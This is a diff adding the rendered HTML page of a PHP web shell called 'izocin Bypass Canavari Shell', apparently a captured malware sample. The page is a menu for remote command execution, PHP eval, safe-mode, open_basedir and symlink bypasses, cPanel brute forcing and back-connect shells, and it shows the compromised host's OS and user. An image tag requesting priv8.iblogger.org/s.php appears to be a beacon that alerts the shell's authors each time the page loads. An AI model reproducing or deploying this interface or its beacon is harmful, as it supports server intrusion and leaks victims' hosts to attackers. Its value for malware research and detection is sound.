@@ -1,0 +1,248 @@
+
+<html>
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>:: izleyici security fucker shell ::</title>
+<style>
+<!--
+body {
+	font-family: Tahoma; font-size: 8pt; color:#00FF00;
+	background-color:#000;
+}
+.td {
+	font-size:80%;
+}
+a:link {
+	text-decoration: none;
+	color: #0080FF
+}
+a:visited {
+	text-decoration: none;
+	color: #0080FF
+}
+a:active {
+	text-decoration: none;
+	color: #0080FF
+}
+a:hover {
+	text-decoration: underline overline;
+	color: #FF0000
+}
+
+.input {
+	border:  1px solid #0c9904 ;
+	BACKGROUND-COLOR: #333333;
+	font: 10pt tahoma;
+	color: #ffffff;
+}
+
+.button {
+	font-size: 13px;
+	color:#0c9904;
+	BACKGROUND-COLOR: #333333;
+	border:  1px solid #0c9904;
+}
+
+.textarea {
+	border:  1px solid #0c9904 ;
+	BACKGROUND-COLOR: #333333;
+	font: Fixedsys bold;
+	color: #ffffff;
+}
+
+#phpinfo {
+	width:80%;
+	font-size:80%;
+	padding-left10px;
+}
+#phpinfo table ,
+#phpinfo td ,
+#phpinfo tr {
+	border:1px solid #9fe3a2;
+}
+#phpinfo pre {}
+#phpinfo a:link {
+	color:red;
+}
+#phpinfo a:hover {}
+#phpinfo table {}
+#phpinfo .center {}
+#phpinfo .center table {}
+#phpinfo .center th {}
+#phpinfo td, th {}
+#phpinfo h1 {
+	font-size:120%;
+}
+#phpinfo h2 {
+	text-decoration:underline;
+	color:#75d584;
+}
+#phpinfo .p {
+ font-size:90%;
+ color:red;
+}
+#phpinfo .e {
+	font-size:80%;
+}
+#phpinfo .h {
+}
+#phpinfo .v {
+	font-size:75%;
+	color:#3e9e25;
+}
+#phpinfo .vr {}
+#phpinfo img {}
+#phpinfo hr {}
+-->
+</style>
+</head>
+
+<body>
+
+<div align="center">
+	<p align="center">
+		<font face=Webdings size=10><b>!</b></font>
+		<SPAN style="FONT-SIZE: 23pt; COLOR: #00CCFF; FONT-FAMILY: Impact">&nbsp;izocin Bypass Canavari Shell&nbsp;</SPAN>
+		<font face=Webdings size=10><b>!</b></font>
+		<br/>Released 15.08.2010
+	</p>
+	<table border="1" width="98%" style="border: 1px solid #0080FF" cellspacing="0" cellpadding="0" height="600">
+		<tr>
+			<td valign="top" rowspan="2">
+				<p align="center"><b>
+					<br><a href="?"><img border="0" src="http://img355.imageshack.us/img355/9250/jutomsec3.png"></a>
+				</p>
+				<p align="center">=====[~]=====</p>
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=fm&dir=/home/cj/MALMAX/malmax-shipped/malmax-shipped/samples/obfuscated/1	">File Manager</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=cmd">Web Command</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=eval">PHP Evaluator</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=529b&bypass=cp">5.2.11 5.3.0 symlink</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=priv8">Safe Modu Offla</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=obypass&opera=cp">Openbasedir Bypass</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="green">
+					<a href="?id=decode">Vbulletin config decoder</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=php4">Php 4 Back</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=444">Php 4.4.x Bypass</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=cgi">Perl cgi</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=lns">ln -s bypass</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=apachi">Apachi Bypass</a>
+				</font></b></p>
+
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=izbypass&ali=cp1">izocin Bypass</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=sysbypass&izo=cp">Symlink Nitrojen</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=siteler">serverdeki siteler</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="">Cpanel Brute</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=bcon">Back Connect</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=mysql">MySQL Query</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=info">Server Infos</a>
+				</font></b></p>
+
+				<p align="center">=====[~]=====</p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+                                       <img border="0" src="http://img355.imageshack.us/img355/9250/jutomsec3.png"></a>
+				</font></b></p>
+					<img border="0" src="http://priv8.iblogger.org/s.php"></a>
+				</font></b></p>
+			</td>
+			<td valign="top" height="500" width="85%" style="border: 1px solid #0080FF" align="left">
+			
+	<p align="center" style="padding-left:20px;">
+	<img border="0" src="http://img143.imageshack.us/img143/4081/securemt9.png"></a><br>
+	</p>
+	<p align="left" style="padding-left:20px;">
+	<font color="#DD8008" size="2"><b>OS : Linux cj-pc 4.15.0-76-generic #86~16.04.1-Ubuntu SMP Mon Jan 20 11:02:50 UTC 2020 x86_64
+	<br>
+	SERVER IP : <font color="#FF0000"></font><br>
+	SERVER NAME : <font color="#FF0000"></font><br>
+	SERVER SOFTWARE : <font color="#FF0000"></font><br>
+	SERVER ADMIN : <font color="#FF0000"></font><br>
+        PHP VERSiON : <font color="#FF0000">7.0.3 </font><br>
+	uid = 1000 ( cj ) &nbsp;&nbsp;&nbsp;&nbsp; gid = 1000 ( cj )<br>
+	</b></font></p>			</td>
+		</tr>
+		<tr>
+			<td style="border: 1px solid #0080FF">
+			<p align="center">
+			<font color="#FF0000" size="2"><b>:::::::::::::::: [ :: Copyright &copy 2010 - yürürlüge giris tarihi</a> by <a href="http://redsecurity.iblogger.org">Red Security Team</a> :: ] :::::::::::::::: </b></font>
+			</p></td>
+		</tr>
+	</table>
+</div>
+</font>
+</body>
+</html>
